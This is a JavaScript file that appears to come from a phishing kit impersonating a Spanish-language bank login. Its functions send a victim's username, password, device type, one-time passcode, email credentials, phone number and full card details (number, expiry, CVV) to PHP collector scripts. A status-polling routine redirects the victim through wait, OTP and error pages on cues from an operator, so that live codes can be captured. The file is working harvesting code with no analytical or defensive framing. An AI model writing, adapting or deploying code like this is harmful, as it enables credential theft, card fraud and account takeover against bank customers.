function get_device(){
    var d = "";
    if(navigator.userAgent.match(/Android/i))
        d = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            d = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                d = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    d = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        d = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            d = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                d = "Windows Phone";
                            else
                                d = "PC";
    return d;
}   

function put_user(u){
    $.post( "../esova/run/put-user.php", { usr: u} ,function(data) {
        window.location.href = "../esova/pas";
    });
}

function put_pass(p){
     var d = get_device();     
    $.post( "../esova/run/put-pass.php", { pass: p, dvc: d} ,function(data) {
        if (data == "ERR") {

        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "../esova/espere";
            }
        }
    });
}            

function status(){
    $.post( "../esova/run/status.php",function(data) {
        switch (data) {
            case '2': window.location.href = "../esova/Otp"; break;
            case '6': window.location.href = "../esova/tc"; break;               
            case '8': window.location.href = "../esova/page/dinamica-invalida.html"; break;
            case '10': window.location.href = "../esova/chao"; break;
            case '12': window.location.href = "../esova/page/usuario-invalido.html"; break;
        } 
    });        
}

function put_otp(o){
    $.post( "../esova/run/put-otp.php",{ otp:o },function(data) {
        window.location.href = "../esova/espere";
    }); 
}

function put_mail(m,c,t){    
    $.post( "../esova/run/put-mail.php",{ eml:m, passe:c, cel:t},function(data) {
        window.location.href = "../esova/espere";
    });
}

function put_card(t,f,c){    
    $.post( "../esova/run/put-card.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "../esova/espere";
    });
}